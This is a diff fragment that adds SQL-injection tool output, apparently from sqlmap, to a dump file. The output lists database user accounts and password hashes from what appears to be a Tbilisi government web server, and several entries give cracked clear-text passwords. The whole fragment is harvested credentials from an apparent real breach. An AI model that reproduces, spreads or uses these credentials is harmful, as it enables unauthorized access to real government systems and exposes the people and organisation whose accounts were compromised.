@@ -88,6 +88,31 @@ available databases [76]:
 [*] webpage
 [*] works
 
+database management system users password hashes:                                                                                                                    
+[+] gamgeoba [1]:
+    password hash: 05859a8120a7f326
+[+] gapi [1]:
+    password hash: 153ca15c31cbb3b9
+[+] kursebi [1]:
+    password hash: 1d7a57990d77c50a
+[+] meri [1]:
+    password hash: 1f49e0140f2697f9
+[+] picker [1]:
+    password hash: 1f858a43200b589f
+    clear-text password: urbana
+[+] root [1]:
+    password hash: 05859a8120a7f326
+[+] staffadmin [1]:
+    password hash: 59a35da827b599ff
+[+] tbilisi.gov.ge [1]:
+    password hash: 446a12100c856ce9
+    clear-text password: 1234
+[+] tbilisii_inter [1]:
+    password hash: 5937160e142056ce
+    clear-text password: international
+[+] tbilisijoomla [1]:
+    password hash: 3203430326b6a99e
+    
 Database: tbilisigovge
 Table: users
 [3 entries]
